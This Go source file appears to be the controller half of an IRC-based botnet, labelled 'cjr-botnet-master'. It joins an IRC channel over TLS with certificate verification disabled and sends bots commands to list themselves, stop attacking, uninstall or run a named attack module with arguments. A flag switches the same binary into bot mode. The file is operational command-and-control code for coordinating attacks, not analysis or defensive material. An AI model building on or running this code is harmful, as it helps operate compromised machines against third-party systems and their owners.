package botnet

import (
	"os"
	"log"
	"strings"
	"crypto/tls"

	"github.com/thoj/go-ircevent"
	flags "github.com/jessevdk/go-flags"
	//modules "cjr/module"
)

var rootOpts struct {
	Module string `short:"m" long:"module" description:"specify a module to use" value-name:"module" default:""`
	Wait bool `long:"wait" description:"only bot use this command, waiting command"`
	List bool `long:"list-bots" description:"list bots under control"`
	Stop bool `long:"stop" description:"stop attacking"`
	Uninstall bool `long:"uninstall" description:"send uninstall command"`
	Help bool `short:"h" long:"help" description:"print this help"`
}

var cmd *flags.Parser = flags.NewParser(&rootOpts, flags.PassAfterNonOption | flags.PrintErrors | flags.IgnoreUnknown)

func init() {
}

var Usage = func() {
	cmd.WriteHelp(os.Stderr)
}

func joinRoom(joined chan int, channel, server, nick string, debug bool) *irc.Connection {
	irccon := irc.IRC(nick, nick)
	//irccon.VerboseCallbackHandler = true
	irccon.Debug = debug
	irccon.UseTLS = true
	irccon.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	irccon.AddCallback("001", func(e *irc.Event) { irccon.Join(channel) }) // /connect command done
	irccon.AddCallback("366", func(e *irc.Event) { joined <- 1 }) // /join command done
	return irccon
}

func Entry(args []string) {

	remainArgs, err := cmd.ParseArgs(args)

	if err != nil {
		panic(err)
	}
	log.Println("args = ", args)
	if len(args) == 0 {
		cmd.WriteHelp(os.Stderr)
		os.Exit(0)
	}
	for _, flag := range remainArgs {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return
		}
	}

	if rootOpts.Wait {
		botInit()
		// should not reach here
	}

	joined := make(chan int)
	irccon := joinRoom(joined, channel, serverssl, "cjr-botnet-master", true)
	irccon.AddCallback("PRIVMSG", func(event *irc.Event) {
		go func(event *irc.Event) {
			log.Println("[" + event.Nick + "]:", event.Message())
		}(event)
	})
	err = irccon.Connect(serverssl)
	if err != nil {
		log.Printf("irc connect error %s", err)
		return
	}

	<-joined
	if rootOpts.List {
		irccon.Privmsg(channel, "!list\n")
	}

	if rootOpts.Stop {
		irccon.Privmsg(channel, "!stop\n")
	}

	if rootOpts.Uninstall {
		log.Println("unimplemented function")
		irccon.Privmsg(channel, "!uninstall\n")
	}

	if len(rootOpts.Module) > 0 {
		//modules.LoadModule(rootOpts.Module, remainArgs)
		irccon.Privmsg(channel, "!module " + rootOpts.Module + " " + strings.Join(remainArgs, " "))
	}

	irccon.Loop()
}
